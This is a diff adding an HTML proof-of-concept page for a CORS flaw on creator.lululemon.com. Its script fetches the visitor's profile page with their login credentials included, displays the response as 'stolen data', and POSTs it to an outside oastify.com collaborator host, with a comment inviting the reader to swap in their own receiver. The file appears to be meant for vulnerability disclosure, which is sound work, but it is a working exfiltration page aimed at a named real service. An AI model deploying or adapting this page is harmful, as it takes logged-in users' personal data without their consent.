@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CORS Credential Leak PoC</title>
+</head>
+
+<body>
+<h2>Lululemon Creator Data Exposure via CORS</h2>
+<p>If you are logged in to creator.lululemon.com, your data will appear below.</p>
+
+<pre id="output">Loading...</pre>
+
+<script>
+const target = "https://creator.lululemon.com/connect/#profile/info";
+
+// replace with your receiver
+const exfil = "https://zru0q3izyq1n47y2zo7h26lar1xslj98.oastify.com";
+
+fetch(target, {
+    method: "GET",
+    credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+    // display stolen data
+    document.getElementById("output").textContent = data;
+
+    // exfiltrate
+    fetch(exfil, {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+    });
+})
+.catch(e => {
+    document.getElementById("output").textContent = e;
+});
+</script>
+
+</body>
+</html>
